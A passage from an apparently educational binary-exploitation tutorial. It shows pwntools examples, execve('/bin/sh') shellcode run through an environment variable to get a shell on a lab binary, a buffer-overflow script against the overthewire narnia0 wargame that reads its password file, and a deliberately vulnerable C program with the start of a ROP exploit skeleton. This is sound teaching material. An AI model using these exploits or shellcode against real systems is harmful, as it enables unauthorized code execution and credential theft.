    <span id="cb232-5"><a href="#cb232-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> flag<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> <span class="op">{</span><span class="ch">&#39;S&#39;</span><span class="op">,</span> <span class="ch">&#39;E&#39;</span><span class="op">,</span> <span class="ch">&#39;C&#39;</span><span class="op">,</span> <span class="ch">&#39;R&#39;</span><span class="op">,</span> <span class="ch">&#39;E&#39;</span><span class="op">,</span> <span class="ch">&#39;T&#39;</span><span class="op">,</span> <span class="ch">&#39;F&#39;</span><span class="op">,</span> <span class="ch">&#39;L&#39;</span><span class="op">,</span> <span class="ch">&#39;A&#39;</span><span class="op">,</span> <span class="ch">&#39;G&#39;</span><span class="op">};</span></span>
    <span id="cb232-6"><a href="#cb232-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> digits<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> <span class="op">{</span><span class="ch">&#39;0&#39;</span><span class="op">,</span> <span class="ch">&#39;1&#39;</span><span class="op">,</span> <span class="ch">&#39;2&#39;</span><span class="op">,</span> <span class="ch">&#39;3&#39;</span><span class="op">,</span> <span class="ch">&#39;4&#39;</span><span class="op">,</span> <span class="ch">&#39;5&#39;</span><span class="op">,</span> <span class="ch">&#39;6&#39;</span><span class="op">,</span> <span class="ch">&#39;7&#39;</span><span class="op">,</span> <span class="ch">&#39;8&#39;</span><span class="op">,</span> <span class="ch">&#39;9&#39;</span><span class="op">};</span></span>
    <span id="cb232-7"><a href="#cb232-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> index <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb232-8"><a href="#cb232-8" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb232-9"><a href="#cb232-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
    <span id="cb232-10"><a href="#cb232-10" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Give me an index and I&#39;ll tell you what&#39;s there!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb232-11"><a href="#cb232-11" aria-hidden="true" tabindex="-1"></a>        scanf<span class="op">(</span><span class="st">&quot;%d&quot;</span><span class="op">,</span> <span class="op">&amp;</span>index<span class="op">);</span></span>
    <span id="cb232-12"><a href="#cb232-12" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Okay, here you go: %p %c</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="op">&amp;</span>digits<span class="op">[</span>index<span class="op">],</span> digits<span class="op">[</span>index<span class="op">]);</span></span>
    <span id="cb232-13"><a href="#cb232-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb232-14"><a href="#cb232-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb232-15"><a href="#cb232-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>We compile it:</p>
    <div class="sourceCode" id="cb233"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb233-1"><a href="#cb233-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@8beb97f8d305:/tutorial/tutorial6#</span> gcc <span class="at">-o</span> leaky leaky.c</span></code></pre></div>
    <p>and run the following Python script:</p>
    <div class="sourceCode" id="cb234"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb234-1"><a href="#cb234-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python</span></span>
    <span id="cb234-2"><a href="#cb234-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb234-3"><a href="#cb234-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb234-4"><a href="#cb234-4" aria-hidden="true" tabindex="-1"></a>leaky_elf <span class="op">=</span> ELF(<span class="st">&#39;leaky&#39;</span>)</span>
    <span id="cb234-5"><a href="#cb234-5" aria-hidden="true" tabindex="-1"></a>main_addr <span class="op">=</span> leaky_elf.symbols[<span class="st">&#39;main&#39;</span>]</span>
    <span id="cb234-6"><a href="#cb234-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb234-7"><a href="#cb234-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Print address of main</span></span>
    <span id="cb234-8"><a href="#cb234-8" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;Main at: &quot;</span> <span class="op">+</span> <span class="bu">hex</span>(main_addr))</span>
    <span id="cb234-9"><a href="#cb234-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb234-10"><a href="#cb234-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Disassemble the first 14 bytes of main</span></span>
    <span id="cb234-11"><a href="#cb234-11" aria-hidden="true" tabindex="-1"></a>log.info(disasm(leaky_elf.read(main_addr, <span class="dv">14</span>), arch<span class="op">=</span><span class="st">&#39;x86&#39;</span>))</span></code></pre></div>
    <p>Delivering:</p>
    <pre><code>root@8beb97f8d305:/tutorial/tutorial6# python example1.py
    [*] &#39;/tutorial/tutorial6/leaky&#39;
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    [*] Main at: 0x4005d6
    [*]    0:   55                      push   ebp
           1:   48                      dec    eax
           2:   89 e5                   mov    ebp,esp
           4:   48                      dec    eax
           5:   83 ec 50                sub    esp,0x50
           8:   89 7d bc                mov    DWORD PTR [ebp-0x44],edi
           b:   48                      dec    eax
           c:   89                      .byte 0x89
           d:   75                      .byte 0x75</code></pre>
    <h3 id="shellcode-from-assembly">Shellcode from assembly</h3>
    <p>Available in <code>example6.py</code>. Shortly:</p>
    <div class="sourceCode" id="cb236"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb236-1"><a href="#cb236-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python</span></span>
    <span id="cb236-2"><a href="#cb236-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb236-3"><a href="#cb236-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb236-4"><a href="#cb236-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Define the context of the working machine</span></span>
    <span id="cb236-5"><a href="#cb236-5" aria-hidden="true" tabindex="-1"></a>context(arch<span class="op">=</span><span class="st">&#39;i386&#39;</span>, os<span class="op">=</span><span class="st">&#39;linux&#39;</span>)</span>
    <span id="cb236-6"><a href="#cb236-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb236-7"><a href="#cb236-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Get a simple shellcode</span></span>
    <span id="cb236-8"><a href="#cb236-8" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;Putting together simple shellcode&quot;</span>)</span>
    <span id="cb236-9"><a href="#cb236-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb236-10"><a href="#cb236-10" aria-hidden="true" tabindex="-1"></a>sh_shellcode2 <span class="op">=</span> <span class="st">&quot;&quot;&quot;</span></span>
    <span id="cb236-11"><a href="#cb236-11" aria-hidden="true" tabindex="-1"></a><span class="st">        /* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */</span></span>
    <span id="cb236-12"><a href="#cb236-12" aria-hidden="true" tabindex="-1"></a><span class="st">        /* push &#39;/bin///sh</span><span class="ch">\x00</span><span class="st">&#39; */</span></span>
    <span id="cb236-13"><a href="#cb236-13" aria-hidden="true" tabindex="-1"></a><span class="st">        push 0x68</span></span>
    <span id="cb236-14"><a href="#cb236-14" aria-hidden="true" tabindex="-1"></a><span class="st">        push 0x732f2f2f</span></span>
    <span id="cb236-15"><a href="#cb236-15" aria-hidden="true" tabindex="-1"></a><span class="st">        push 0x6e69622f</span></span>
    <span id="cb236-16"><a href="#cb236-16" aria-hidden="true" tabindex="-1"></a><span class="st">        mov ebx, esp</span></span>
    <span id="cb236-17"><a href="#cb236-17" aria-hidden="true" tabindex="-1"></a><span class="st">        /* push argument array [&#39;sh</span><span class="ch">\x00</span><span class="st">&#39;] */</span></span>
    <span id="cb236-18"><a href="#cb236-18" aria-hidden="true" tabindex="-1"></a><span class="st">        /* push &#39;sh</span><span class="ch">\x00\x00</span><span class="st">&#39; */</span></span>
    <span id="cb236-19"><a href="#cb236-19" aria-hidden="true" tabindex="-1"></a><span class="st">        push 0x1010101</span></span>
    <span id="cb236-20"><a href="#cb236-20" aria-hidden="true" tabindex="-1"></a><span class="st">        xor dword ptr [esp], 0x1016972</span></span>
    <span id="cb236-21"><a href="#cb236-21" aria-hidden="true" tabindex="-1"></a><span class="st">        xor ecx, ecx</span></span>
    <span id="cb236-22"><a href="#cb236-22" aria-hidden="true" tabindex="-1"></a><span class="st">        push ecx /* null terminate */</span></span>
    <span id="cb236-23"><a href="#cb236-23" aria-hidden="true" tabindex="-1"></a><span class="st">        push 4</span></span>
    <span id="cb236-24"><a href="#cb236-24" aria-hidden="true" tabindex="-1"></a><span class="st">        pop ecx</span></span>
    <span id="cb236-25"><a href="#cb236-25" aria-hidden="true" tabindex="-1"></a><span class="st">        add ecx, esp</span></span>
    <span id="cb236-26"><a href="#cb236-26" aria-hidden="true" tabindex="-1"></a><span class="st">        push ecx /* &#39;sh</span><span class="ch">\x00</span><span class="st">&#39; */</span></span>
    <span id="cb236-27"><a href="#cb236-27" aria-hidden="true" tabindex="-1"></a><span class="st">        mov ecx, esp</span></span>
    <span id="cb236-28"><a href="#cb236-28" aria-hidden="true" tabindex="-1"></a><span class="st">        xor edx, edx</span></span>
    <span id="cb236-29"><a href="#cb236-29" aria-hidden="true" tabindex="-1"></a><span class="st">        /* call execve() */</span></span>
    <span id="cb236-30"><a href="#cb236-30" aria-hidden="true" tabindex="-1"></a><span class="st">        push SYS_execve /* 0xb */</span></span>
    <span id="cb236-31"><a href="#cb236-31" aria-hidden="true" tabindex="-1"></a><span class="st">        pop eax</span></span>
    <span id="cb236-32"><a href="#cb236-32" aria-hidden="true" tabindex="-1"></a><span class="st">        int 0x80</span></span>
    <span id="cb236-33"><a href="#cb236-33" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;&quot;&quot;</span></span>
    <span id="cb236-34"><a href="#cb236-34" aria-hidden="true" tabindex="-1"></a><span class="co"># Create a binary out of some shellcode</span></span>
    <span id="cb236-35"><a href="#cb236-35" aria-hidden="true" tabindex="-1"></a>e <span class="op">=</span> ELF.from_assembly(sh_shellcode2, vma<span class="op">=</span><span class="bn">0x400000</span>, arch<span class="op">=</span><span class="st">&#39;i386&#39;</span>)</span></code></pre></div>
    <h3 id="shellcraft">Shellcraft</h3>
    <p>Only managed to make it work for 32-bit binaries. Refer to <code>example4.py</code> for a working example with 32-bits and to <code>example5.py</code> for a non-working example with 64-bits.</p>
    <pre><code>docker run -v /Users/victor/basic_cybersecurity:/tutorial -it pwnbox:latest
    ...
    root@ffac9df3ac02:/tutorial/tutorial6# python example4.py
    [*] Compiling the binary narnia1_local
    narnia1.c: In function &#39;main&#39;:
    narnia1.c:21:5: warning: implicit declaration of function &#39;getenv&#39; [-Wimplicit-function-declaration]
      if(getenv(&quot;EGG&quot;)==NULL){    
         ^
    narnia1.c:21:18: warning: comparison between pointer and integer
      if(getenv(&quot;EGG&quot;)==NULL){    
                      ^
    narnia1.c:23:3: warning: implicit declaration of function &#39;exit&#39; [-Wimplicit-function-declaration]
       exit(1);
       ^
    narnia1.c:23:3: warning: incompatible implicit declaration of built-in function &#39;exit&#39;
    narnia1.c:23:3: note: include &#39;&lt;stdlib.h&gt;&#39; or provide a declaration of &#39;exit&#39;
    narnia1.c:27:6: warning: assignment makes pointer from integer without a cast [-Wint-conversion]
      ret = getenv(&quot;EGG&quot;);
          ^
    [*] Putting together simple shellcode
    jhh///sh/bin\x89?h\x814$ri1?Qj\x04Y?Q??1?j\x0bX̀
    [*] Introduce shellcode in EGG env. variable
    [*] Launching narnia1_local
    [!] Could not find executable &#39;narnia1_local&#39; in $PATH, using &#39;./narnia1_local&#39; instead
    [+] Starting local process &#39;./narnia1_local&#39;: pid 38
    [*] Switching to interactive mode
    Trying to execute EGG!
    $ uname -a
    Linux ffac9df3ac02 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
    <p>Issue raised at https://github.com/Gallopsled/pwntools/issues/1142.</p>
    <h3 id="gdb-integration">GDB integration</h3>
    <p>Issue with the terminal fixed at https://github.com/Gallopsled/pwntools/issues/1140.</p>
    <p>New issue at https://github.com/Gallopsled/pwntools/issues/1117.</p>
    <h3 id="examples">Examples</h3>
    <h4 id="narnia1">narnia1</h4>
    <p>As an example, provided the following problem http://overthewire.org/wargames/narnia/narnia1.html:</p>
    <div class="sourceCode" id="cb238"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb238-1"><a href="#cb238-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb238-2"><a href="#cb238-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb238-3"><a href="#cb238-3" aria-hidden="true" tabindex="-1"></a>context(arch<span class="op">=</span><span class="st">&#39;i386&#39;</span>, os<span class="op">=</span><span class="st">&#39;linux&#39;</span>)</span>
    <span id="cb238-4"><a href="#cb238-4" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> ssh(user<span class="op">=</span><span class="st">&#39;narnia0&#39;</span>, host<span class="op">=</span><span class="st">&#39;narnia.labs.overthewire.org&#39;</span>, password<span class="op">=</span><span class="st">&#39;narnia0&#39;</span>, port<span class="op">=</span><span class="dv">2226</span>)</span>
    <span id="cb238-5"><a href="#cb238-5" aria-hidden="true" tabindex="-1"></a>sh <span class="op">=</span> s.run(<span class="st">&#39;/narnia/narnia0&#39;</span>)</span>
    <span id="cb238-6"><a href="#cb238-6" aria-hidden="true" tabindex="-1"></a>sh.sendline(<span class="st">&#39;A&#39;</span><span class="op">*</span><span class="dv">20</span> <span class="op">+</span> p32(<span class="bn">0xdeadbeef</span>))</span>
    <span id="cb238-7"><a href="#cb238-7" aria-hidden="true" tabindex="-1"></a>sh.sendline(<span class="st">&#39;cat /etc/narnia_pass/narnia1&#39;</span>)</span>
    <span id="cb238-8"><a href="#cb238-8" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="dv">1</span>:</span>
    <span id="cb238-9"><a href="#cb238-9" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(sh.recvline())</span>
    <span id="cb238-10"><a href="#cb238-10" aria-hidden="true" tabindex="-1"></a><span class="co"># log.info(&#39;Flag: &#39;+sh.recvline().split(&#39;\n&#39;)[0])</span></span>
    <span id="cb238-11"><a href="#cb238-11" aria-hidden="true" tabindex="-1"></a>s.close()</span></code></pre></div>
    <h3 id="resources-14">Resources</h3>
    <ul>
    <li>[1] Gallopsled, <em>pwntools</em>. Retrieved from https://github.com/Gallopsled/pwntools.</li>
    <li>[2] Gallopsled, <em>pwntools Docs</em>. Retrieved from https://docs.pwntools.com/en/stable/index.html.</li>
    <li>[3] Exploit Database. Retrieved from https://www.exploit-db.com/.</li>
    <li>[4] University Politehnica of Bucharest, Computer Science and Engineering Department, Computer and Network Security. <em>Lab 07 - Exploiting. Shellcodes (Part 2)</em>. Retrieved from https://ocw.cs.pub.ro/courses/cns/labs/lab-07.</li>
    </ul>
    <h2 id="wip-linux-binary-protections">WIP: Linux Binary Protections</h2>
    <p>Available at https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/5_protections/lessonplan.md.</p>
    <h3 id="resources-15">Resources</h3>
    <ul>
    <li>[1] Linux exploitation course. Retrieved from https://github.com/nnamon/linux-exploitation-course.</li>
    </ul>
    <h2 id="building-a-pwnbox">Building a pwnbox</h2>
    <p>Simple pwnbox can be fetched from [1]. Docker container can be obtained thorugh:</p>
    <div class="sourceCode" id="cb239"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb239-1"><a href="#cb239-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> pull superkojiman/pwnbox</span></code></pre></div>
    <p>A local dockerfile has also been provided which lays out basic utilities for a diy-pwnbox. Use the pwnbox from superkojiman for better results.</p>
    <h3 id="resources-16">Resources</h3>
    <ul>
    <li>[1] pwnbox. Retrieved from https://github.com/superkojiman/pwnbox.</li>
    </ul>
    <h2 id="wip-bypassing-nx-with-return-oriented-programming">WIP: Bypassing NX with Return Oriented Programming</h2>
    <p>In this tutorial we’ll review how to bypass a “No eXecute” (NX) flag within a binary.</p>
    <p>Also known as Data Execution Prevention (DEP), this protection marks writable regions of memory as non-executable. This prevents the processor from executing in these marked regions of memory.</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb240"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb240-1"><a href="#cb240-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity10:latest .</span></code></pre></div>
    <p>and run with:</p>
    <div class="sourceCode" id="cb241"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb241-1"><a href="#cb241-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-v</span> <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span>:/root/tutorial <span class="at">-it</span> basic_cybersecurity10:latest</span></code></pre></div>
    <hr />
    <h4 id="enabling-nx">Enabling NX</h4>
    <p>Following content is heavily inspired on [1,2]:</p>
    <div class="sourceCode" id="cb242"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb242-1"><a href="#cb242-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
    <span id="cb242-2"><a href="#cb242-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb242-3"><a href="#cb242-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
    <span id="cb242-4"><a href="#cb242-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></span>
    <span id="cb242-5"><a href="#cb242-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
    <span id="cb242-6"><a href="#cb242-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb242-7"><a href="#cb242-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vuln<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb242-8"><a href="#cb242-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">128</span><span class="op">];</span></span>
    <span id="cb242-9"><a href="#cb242-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span> second_buffer<span class="op">;</span></span>
    <span id="cb242-10"><a href="#cb242-10" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint32_t</span> length <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb242-11"><a href="#cb242-11" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;Reading from STDIN&quot;</span><span class="op">);</span></span>
    <span id="cb242-12"><a href="#cb242-12" aria-hidden="true" tabindex="-1"></a>    read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> buffer<span class="op">,</span> <span class="dv">1024</span><span class="op">);</span></span>
    <span id="cb242-13"><a href="#cb242-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb242-14"><a href="#cb242-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>strcmp<span class="op">(</span>buffer<span class="op">,</span> <span class="st">&quot;Cool Input&quot;</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
    <span id="cb242-15"><a href="#cb242-15" aria-hidden="true" tabindex="-1"></a>        puts<span class="op">(</span><span class="st">&quot;What a cool string.&quot;</span><span class="op">);</span></span>
    <span id="cb242-16"><a href="#cb242-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb242-17"><a href="#cb242-17" aria-hidden="true" tabindex="-1"></a>    length <span class="op">=</span> strlen<span class="op">(</span>buffer<span class="op">);</span></span>
    <span id="cb242-18"><a href="#cb242-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>length <span class="op">==</span> <span class="dv">42</span><span class="op">)</span> <span class="op">{</span></span>
    <span id="cb242-19"><a href="#cb242-19" aria-hidden="true" tabindex="-1"></a>        puts<span class="op">(</span><span class="st">&quot;LUE&quot;</span><span class="op">);</span></span>
    <span id="cb242-20"><a href="#cb242-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb242-21"><a href="#cb242-21" aria-hidden="true" tabindex="-1"></a>    second_buffer <span class="op">=</span> malloc<span class="op">(</span>length<span class="op">);</span></span>
    <span id="cb242-22"><a href="#cb242-22" aria-hidden="true" tabindex="-1"></a>    strncpy<span class="op">(</span>second_buffer<span class="op">,</span> buffer<span class="op">,</span> length<span class="op">);</span></span>
    <span id="cb242-23"><a href="#cb242-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb242-24"><a href="#cb242-24" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb242-25"><a href="#cb242-25" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb242-26"><a href="#cb242-26" aria-hidden="true" tabindex="-1"></a>    setvbuf<span class="op">(</span>stdin<span class="op">,</span> NULL<span class="op">,</span> _IONBF<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb242-27"><a href="#cb242-27" aria-hidden="true" tabindex="-1"></a>    setvbuf<span class="op">(</span>stdout<span class="op">,</span> NULL<span class="op">,</span> _IONBF<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb242-28"><a href="#cb242-28" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb242-29"><a href="#cb242-29" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;This is a big vulnerable example!&quot;</span><span class="op">);</span></span>
    <span id="cb242-30"><a href="#cb242-30" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;I can print many things: %x, %s, %d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="bn">0xdeadbeef</span><span class="op">,</span> <span class="st">&quot;Test String&quot;</span><span class="op">,</span></span>
    <span id="cb242-31"><a href="#cb242-31" aria-hidden="true" tabindex="-1"></a>            <span class="dv">42</span><span class="op">);</span></span>
    <span id="cb242-32"><a href="#cb242-32" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span><span class="dv">1</span><span class="op">,</span> <span class="st">&quot;Writing to STDOUT</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="dv">18</span><span class="op">);</span></span>
    <span id="cb242-33"><a href="#cb242-33" aria-hidden="true" tabindex="-1"></a>    vuln<span class="op">();</span></span>
    <span id="cb242-34"><a href="#cb242-34" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>When compiling this code we’ll aim to mark the writable regions of memory as non-executable. According to the original source [1], the resulting binary isn’t big enough to perform ROP attacks. Let’s see:</p>
    <div class="sourceCode" id="cb243"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb243-1"><a href="#cb243-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~/tutorial#</span> pwd</span>
    <span id="cb243-2"><a href="#cb243-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/root/tutorial</span></span>
    <span id="cb243-3"><a href="#cb243-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~/tutorial#</span> gcc <span class="at">-m32</span> <span class="at">-g</span> <span class="at">-fno-stack-protector</span> <span class="at">-znoexecstack</span> <span class="at">-o</span> ./build/1_nx ./src/1_staticnx.c</span>
    <span id="cb243-4"><a href="#cb243-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~/tutorial#</span> ls <span class="at">-lh</span> build/1_nx</span>
    <span id="cb243-5"><a href="#cb243-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span> 1 root root 7.6K Jun 18 17:49 build/1_nx</span></code></pre></div>
    <p>So what we do instead is compiling it as a statically linked ELF. This should include library code in the final executable and bulk up the size of the binary.</p>
    <pre><code>root@9a78bba9592e:~/tutorial# gcc -m32 -g -fno-stack-protector -static -znoexecstack -o ./build/1_staticnx ./src/1_staticnx.c
    root@9a78bba9592e:~/tutorial# ls -lh build/1_
    1_nx        1_staticnx  
    root@9a78bba9592e:~/tutorial# ls -lh build/1_
    1_nx        1_staticnx  
    root@9a78bba9592e:~/tutorial# ls -lh build/1_staticnx
    -rwxr-xr-x 1 root root 729K Jun 18 17:51 build/1_staticnx</code></pre>
    <p>There’s indeed a big difference between them.</p>
    <p>Checking the security of these files indeed deliver an active NX flag:</p>
    <div class="sourceCode" id="cb245"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb245-1"><a href="#cb245-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~/tutorial#</span> checksec build/1_<span class="pp">*</span></span>
    <span id="cb245-2"><a href="#cb245-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/root/tutorial/build/1_nx&#39;</span></span>
    <span id="cb245-3"><a href="#cb245-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>     i386-32-little</span>
    <span id="cb245-4"><a href="#cb245-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>    Partial RELRO</span>
    <span id="cb245-5"><a href="#cb245-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>    No canary found</span>
    <span id="cb245-6"><a href="#cb245-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>       NX enabled</span>
    <span id="cb245-7"><a href="#cb245-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>      No PIE <span class="er">(</span><span class="ex">0x8048000</span><span class="kw">)</span></span>
    <span id="cb245-8"><a href="#cb245-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/root/tutorial/build/1_staticnx&#39;</span></span>
    <span id="cb245-9"><a href="#cb245-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>     i386-32-little</span>
    <span id="cb245-10"><a href="#cb245-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>    Partial RELRO</span>
    <span id="cb245-11"><a href="#cb245-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>    No canary found</span>
    <span id="cb245-12"><a href="#cb245-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>       NX enabled</span>
    <span id="cb245-13"><a href="#cb245-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>      No PIE <span class="er">(</span><span class="ex">0x8048000</span><span class="kw">)</span></span></code></pre></div>
    <h4 id="obtaining-eip-control">Obtaining EIP Control</h4>
    <p>Let’s build a exploit to take control of the instructions pointer. A first skeleton is presented below:</p>
    <div class="sourceCode" id="cb246"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb246-1"><a href="#cb246-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
    <span id="cb246-2"><a href="#cb246-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb246-3"><a href="#cb246-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb246-4"><a href="#cb246-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb246-5"><a href="#cb246-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> main():</span>
    <span id="cb246-6"><a href="#cb246-6" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Start the process</span></span>
    <span id="cb246-7"><a href="#cb246-7" aria-hidden="true" tabindex="-1"></a>    p <span class="op">=</span> process(<span class="st">&quot;../build/1_staticnx&quot;</span>)</span>
    <span id="cb246-8"><a href="#cb246-8" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb246-9"><a href="#cb246-9" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Craft the payload</span></span>
    <span id="cb246-10"><a href="#cb246-10" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="dv">148</span> <span class="op">+</span> p32(<span class="bn">0xdeadc0de</span>)</span>
    <span id="cb246-11"><a href="#cb246-11" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> payload.ljust(<span class="dv">1000</span>, <span class="st">&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span>)</span>
    <span id="cb246-12"><a href="#cb246-12" aria-hidden="true" tabindex="-1"></a></span>
